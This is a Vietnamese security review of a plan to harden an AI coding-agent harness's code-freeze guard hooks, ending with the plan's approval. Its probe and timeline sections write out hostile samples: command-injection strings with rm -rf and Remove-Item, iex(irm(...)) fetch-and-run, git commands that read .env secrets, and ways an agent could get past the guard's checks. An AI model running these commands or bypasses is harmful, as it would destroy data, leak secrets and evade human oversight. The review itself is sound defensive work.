| **P0-1** | Whitelist token thay blacklist regex cho lệnh shell                  | ĐÃ LẬP KẾ HOẠCH SỬA | `[SRC]` `.agents/scripts/code-freeze-guard.js:62` regex `^git ... (?: \S+)*$` và `:69` `SHELL_ESCAPE_HATCHES` bỏ sót `()`, `{}`, `<()`, `$env`, smart quotes. Kế hoạch trích xuất `command-policy.js` dùng `SAFE_TOKEN` + `COMMAND_RULES` và Test Contract TC-A/TC-B phủ toàn diện.                                                                     |
| **P0-2** | Chặn bypass approve plan qua công cụ chỉnh sửa                       | BỎ QUA              | Quyết định của Product Manager: giữ nguyên cơ chế duyệt plan hiện tại qua `replace_file_content`/`edit_file`/`Edit`, chỉ chặn `write_to_file`/`write_file`/`Write` tạo/ghi đè 1 bước gắn sẵn Approved. Kế hoạch đã ghi nhận Out of Scope tại §1.2.                                                                                                      |
| **P0-3** | Always-ask cho file hạ tầng và cấu hình nhạy cảm                     | ĐÃ LẬP KẾ HOẠCH SỬA | `[SRC]` `.agents/scripts/code-freeze-guard.js:76-85` (`TEST_INFRA_FILES`) thiếu `scripts/code-freeze-guard.js`, `.claude/**`, `.husky/**`, `next.config.ts`, `package-lock.json`, `.npmrc`, `AGENTS.md`, `CLAUDE.md`. Kế hoạch bổ sung Gate 3c `isProtectedInfraFile()` ưu tiên cao hơn Gate 9 (Plan Scope Guard).                                      |
| **P0-4** | Ngân sách ký tự governance TC-08 (< 18,000)                          | ĐÃ LẬP KẾ HOẠCH SỬA | `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` trả về lỗi tại `code-freeze-guard.test.ts:1508`: `expected 19434 to be less than 18000`. Kế hoạch chuyển bảng markdown tại `02-quality.md` thành danh sách bullet, ước tính giảm > 2,400 ký tự (mục tiêu <= 17,000), bảo lưu đủ 15 assertion M5.                      |
| **P1-5** | Chặn rò rỉ secret `.env*` qua git và công cụ đọc                     | ĐÃ LẬP KẾ HOẠCH SỬA | `[SRC]` `.agents/scripts/code-freeze-guard.js:537-541` chỉ chặn `Read                                                                                                                                                                                                                                                                                   | read_file | view_file`mà không chặn`Grep`; `.agents/hooks.json:5`matcher thiếu`view_file | read_file`; `run-claude.ps1:170`thiếu rule`Grep(.env*)`và git`.env*`. Kế hoạch bổ sung đầy đủ bộ lọc secret ở cả tầng command parser, tool reader, và settings hook. |
| **P1-6** | Đồng bộ bề mặt cấu hình Claude Code CLI                              | ĐÃ LẬP KẾ HOẠCH SỬA | `[SRC]` `.claude/settings.local.json:11-14` chứa quyền git mutating (`git checkout/add/commit/push`); thiếu `CLAUDE.md`, `.claude/settings.json` và stub skills. Kế hoạch dọn dẹp `settings.local.json`, thêm `CLAUDE.md` import rules chuẩn, cấu hình `.claude/settings.json` có `"onFailure": "block"`, và thêm 4 stub skills dưới `.claude/skills/`. |
| **P1-7** | Giới hạn scope chỉnh sửa theo file khai báo trong plan               | ĐÃ LẬP KẾ HOẠCH SỬA | Theo chỉ đạo của PM: phân tích các thẻ `[NEW]`/`[MODIFY]`/`[DELETE]` trong `## Technical Plan` của plan Approved. Kế hoạch trích xuất module `plan-scope.js` với hàm `extractDeclaredFiles` loại bỏ glob/traversal, từ chối (`ask`) mọi file nằm ngoài danh sách đã khai báo.                                                                           |
| **P2**   | Hardening phụ (exit 2, Fast-Track .tsx, $PSScriptRoot, đường dẫn cũ) | ĐÃ LẬP KẾ HOẠCH SỬA | `[SRC]` `code-freeze-guard.js:895-926` fail-open khi crash; `run-claude.ps1:26` dùng `(Get-Location).Path`; `streaming-patterns/SKILL.md:41-51` và `mental-simulation.md:52,54,59` chứa đường dẫn cũ. Kế hoạch sửa đổi có kiểm chứng rõ ràng.                                                                                                           |

#### 2. Phát Hiện Mới

Không phát hiện lỗi mới thuộc mức độ `[BLOCKER]` hoặc `[MAJOR]`. Kế hoạch tuân thủ kiến trúc phân tầng, nguyên tắc fail-closed, duy trì tính tương thích ngược cho proxy `scripts/code-freeze-guard.js` và toàn bộ 120 test hiện có.

#### 3. Các Tấn Công Đã Thử (Attack Probes)

Đã thực hiện 4 kịch bản đối kháng nhằm tìm kiếm lỗ hổng trong bản kế hoạch nhưng không làm vỡ được cấu trúc thiết kế:

1. **Probe 1: PowerShell Argument Mode & Token Injection qua `-Task`**:
   - _Kịch bản_: Thử chèn biểu thức con hoặc smart quotes vào `-Task` (`powershell ... -Task 'a’; rm -rf src; ‘b'` hoặc `-Task (iex(irm(...)))`).
   - _Kết quả_: Kế hoạch kiểm soát ở 2 lớp: (1) `evaluateCommand` trong `command-policy.js` cấm ký tự `(`, `{`, smart quotes U+2018–U+201F ở mọi vị trí; (2) khi `-Task` dùng nháy đơn `'...'`, `run-claude.ps1:210-225` bọc chuỗi an toàn qua `Escape-NativeArg` và truyền vào `-p` cho tiến trình Claude CLI, không bao giờ được shell evaluate thành code `[SRC]` `run-claude.ps1:41`.
2. **Probe 2: Plan Scope Bypass qua Directory Traversal, Globbing hoặc Tự Khai Báo Infra**:
   - _Kịch bản_: Plan đã duyệt cố tình khai báo `[NEW] ../outside.ts`, `[MODIFY] src/*.ts`, hoặc `[MODIFY] scripts/code-freeze-guard.js` để mở khóa file hệ thống.
   - _Kết quả_: (1) `extractDeclaredFiles` tự động lọc bỏ các đường dẫn chứa `..`, glob `*`, `?`, hoặc kết thúc bằng `/`; (2) thứ tự kiểm tra tại Gate 3b/3c/4/5/6/7 được thực thi TRƯỚC Gate 9 (Plan Scope Guard), do đó file infra hoặc server-only luôn trả về `ask` kể cả khi có mặt trong danh sách declared files `[SRC]` `docs/plans/2026-10-24-agent-harness-security-hardening-implementation-plan.md:198-210`.
3. **Probe 3: Rò Rỉ Secret `.env*` qua Git Command Injection & Grep Tool**:
   - _Kịch bản_: Gọi `git show HEAD:.env.local`, `git diff --no-index a .env`, `git log -- .en[v]`, hoặc dùng tool `Grep` quét thư mục `src` với pattern `.env*`.
   - _Kết quả_: (1) Parser `gitArgs` tách segment, loại bỏ tiền tố `<rev>:`, chuẩn hóa đường dẫn và kiểm tra `isEnvSecretPath()`; (2) token chứa ký tự glob (`*?[ ]`) hoặc cờ `--no-index` bị từ chối; (3) nhánh xử lý tool đọc trong `decide()` mở rộng kiểm tra cả `targetFile` lẫn `searchGlob` của `Grep`; (4) `.agents/hooks.json` mở rộng matcher bao gồm `view_file|read_file` `[SRC]` §6.4, §7 Bước 3.
4. **Probe 4: Fast-Track Bypass trên `.tsx` qua Web & Storage APIs**:
   - _Kịch bản_: Agent lợi dụng Fast-Track micro-UI (<= 40 dòng trên file `.tsx`) để chèn mã gọi `fetch()`, `WebSocket`, `localStorage`, `eval()`, hoặc `window.location`.
   - _Kết quả_: Kế hoạch định nghĩa regex riêng `FAST_TRACK_FORBIDDEN_CONTENT_TSX` bắt toàn bộ các API có side-effect trên file `.tsx` và chuyển tiếp sang Gate 9 yêu cầu plan; trong khi các chuỗi văn bản thông thường trên file dịch thuật (`en.ts`/`vi.ts`) không bị ảnh hưởng do không áp dụng regex này `[SRC]` §7 Bước 6.

#### 4. Plan Completeness Gate & Mental Simulation Matrix

##### Plan Completeness Gate (7 Hạng Mục Cốt Lõi)

| #   | Hạng mục                              | Đánh giá | Loại bằng chứng   | Chi tiết                                                                                                                                                                                      |
| :-- | :------------------------------------ | :------- | :---------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Bảng Verified Versions                | PASS     | `[URL]` + `[SRC]` | Khảo sát Node 24, Vitest 4.1.12, TypeScript 5.9.3, Prettier 3.7.4, Husky 9.1.7, Claude Code hooks (>= 2.1.295), permissions, memory `@imports`, PowerShell 5.1 parsing rules (§4).            |
| 2   | Checklist các bước tuần tự            | PASS     | `[SRC]`           | Danh sách file `[NEW]`, `[MODIFY]`, `[DELETE]` tại §5 và trình tự 10 bước (Bước 0 đến Bước 9) tại §7.                                                                                         |
| 3   | Kế hoạch kiểm thử (Verification Plan) | PASS     | `[CMD]` + `[SRC]` | Lệnh kiểm thử rõ ràng, 5 Wiring Probes (WP1–WP5) và bảng đối chiếu Negative Probes (§9).                                                                                                      |
| 4   | Test Contract cụ thể                  | PASS     | `[SRC]`           | Định nghĩa 9 nhóm test hợp đồng (TC-A đến TC-I) với input, output, failure modes cụ thể, loại trừ `toBeDefined` mơ hồ (§8).                                                                   |
| 5   | Assumptions & Cross-Task Dependencies | PASS     | `[SRC]` + `[URL]` | 13 giả định kỹ thuật có đối soát (A1–A13), 3 quyết định kỹ thuật mặc định (D1–D3), và phụ thuộc thứ tự (§3).                                                                                  |
| 6   | Out of Scope rõ ràng                  | PASS     | `[SRC]`           | Loại trừ rõ P0-2, OS sandboxing, git log không pathspec, SSE wire format rewrite (§1.2).                                                                                                      |
| 7   | Skills Loaded & Applied               | PASS     | `[SRC]`           | Nạp và ánh xạ 5 tài liệu/skills liên quan: `vikini-investigate` (/blast-radius), `vikini-debug` (TC-08 root cause), `vikini-audit`, `docs/security.md`, `streaming-patterns/SKILL.md` (§2.2). |

##### Mental Simulation Matrix (S1–S6 + Domain)

| Kịch bản                                 | Đánh giá | Loại bằng chứng | Chi tiết thẩm định                                                                                                                                                                        |
| :--------------------------------------- | :------- | :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **S1: Cold-start & Build**               | PASS     | `[CMD]`         | `npm run type-check` đạt exit code 0; `vitest` xác nhận đúng 1 lỗi baseline TC-08 (19,434 chars); không phát sinh phụ thuộc mới trong `package.json`.                                     |
| **S2: Runner Lifecycle & Teardown**      | PASS     | `[SRC]`         | `installCrashHandlers()` và `runHook()` xử lý ngoại lệ đồng bộ/bất đồng bộ, giải phóng stdin stream, không có tài nguyên rò rỉ.                                                           |
| **S3: Database & Temporal Logic**        | N/A      | `[SRC]`         | Phạm vi thuần túy hạ tầng harness và governance, không chạm database/migrations.                                                                                                          |
| **S4: Cross-Task State Flow**            | PASS     | `[SRC]`         | Module tách biệt giữ nguyên toàn bộ exports cho `scripts/code-freeze-guard.js:6` và 120 test hiện có; cơ chế date-group khóa toàn diện cho đến khi plan được duyệt.                       |
| **S5: Security Boundary & 3-Tier Auth**  | PASS     | `[ADV]`         | Đã xác minh 4 trục đối kháng (Đồng thời, TOCTOU/Injection, Hook Crash, Case-Insensitive NTFS) đạt trạng thái an toàn.                                                                     |
| **S6: External Resilience & Serverless** | PASS     | `[SRC]`         | Sửa đổi đồng bộ các đường dẫn cũ trong `mental-simulation.md:52,54,59` (`maxDuration` tại `edit-image/route.ts:36`, `describe-image/route.ts:18`, và vị trí đúng của `batchGenQuota.ts`). |
| **Domain: Open Inquiry**                 | PASS     | `[SRC]`         | Đáp ứng đầy đủ các chỉ đạo của Product Manager (P0-2, P1-7, P2 Fast-Track); giải pháp tối ưu ngân sách ký tự TC-08 bảo toàn 15 tiêu chí M5.                                               |

#### 5. Adversarial Timelines & Commands Executed

##### Adversarial Timelines (4 Trục Bắt Buộc)

```
Trục 1 (Đồng thời / Multi-agent Race):
T1: Agent A yêu cầu ghi file nghiệp vụ 'src/foo.tsx'
T2: Agent B cố tình gọi lệnh can thiệp file nhạy cảm 'scripts/code-freeze-guard.js' hoặc '.env'
T3: Hook PreToolUse chạy đồng bộ: 'isProtectedInfraFile' và 'isEnvSecretPath' thẩm định trước 'isDeclared'
Kết cục: File hạ tầng và secret luôn bị chặn (ask) độc lập với trạng thái plan → AN TOÀN

Trục 2 (TOCTOU & Shell Command Injection):
T1: Agent gửi lệnh 'git status (Remove-Item -Recurse src)' hoặc 'git diff <(cat .env)'
T2: Blacklist cũ kiểm tra SHELL_ESCAPE_HATCHES (bỏ sót dấu ngoặc và process substitution)
T3: Tokenizer 'command-policy.js' tách token theo SAFE_TOKEN, phát hiện ký tự metacharacter ngoài nháy
Kết cục: Lệnh bị từ chối (ask) ngay lập tức trước khi chuyển giao cho hệ vỏ shell thực thi → AN TOÀN

Trục 3 (Thất bại giữa chừng / Hook Crash Fail-Closed):
T1: Đầu vào không mong muốn gây lỗi ngoại lệ chưa bắt được trong hook
T2: Cơ chế cũ thoát exit code 1 (Claude Code coi là non-blocking và cho phép tool chạy tiếp)
T3: Crash handler mới bắt exception, thoát exit code 2; cấu hình .claude/settings.json với 'onFailure: block'
Kết cục: Claude Code chặn hoàn toàn thao tác (block), không xảy ra fail-open → AN TOÀN

Trục 4 (Môi trường runtime & Case-Insensitive NTFS):
T1: Agent cố ghi file vào '.Claude/Settings.json', 'package.JSON', hoặc '.AGENTS/rules/00-core.md'
T2: Hệ điều hành Windows coi là cùng một file nhưng kiểm tra chuỗi thông thường trả về không khớp
T3: Tất cả các cổng kiểm soát (Gate 2, 3b, 3c, 7, 9) chuẩn hóa đường dẫn qua 'normalizeForCompare' (POSIX lower-case)
Kết cục: Các biến thể chữ hoa/thường đều bị phát hiện và chặn đúng quy tắc → AN TOÀN
```

##### Commands Executed

```powershell
# Bước 0: Nạp tài liệu vệ tinh
view_file .agents/agents/reviewer/allowlist.md
view_file .agents/agents/reviewer/evidence-bar.md
view_file .agents/agents/reviewer/mental-simulation.md

# Bước 1 & 4: Khảo sát mã nguồn thực tế & chạy lệnh allowlist read-only
npm run type-check                                                      # Exit code 0 (S1 Baseline)
npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot  # 1 failed (TC-08 19434 chars), 119 passed
git status                                                              # Working tree inspection
git ls-files -- .audit_run7.tmp.md temp.html .superpowers               # Xác nhận toàn bộ file rác đang được tracked
```

#### 6. Kết Luận

Kế hoạch triển khai đã giải quyết đầy đủ các lỗ hổng P0 (trừ P0-2 theo quyết định của PM), P1 và P2; thiết kế kiến trúc phân tách rõ ràng; hợp đồng kiểm thử co-located và các bài kiểm tra phủ kín các kịch bản đối kháng; đáp ứng hoàn toàn tiêu chuẩn quản trị mã nguồn dự án Vikini.

Kế hoạch được chính thức phê duyệt để tiến hành triển khai.

[PLAN_APPROVED]
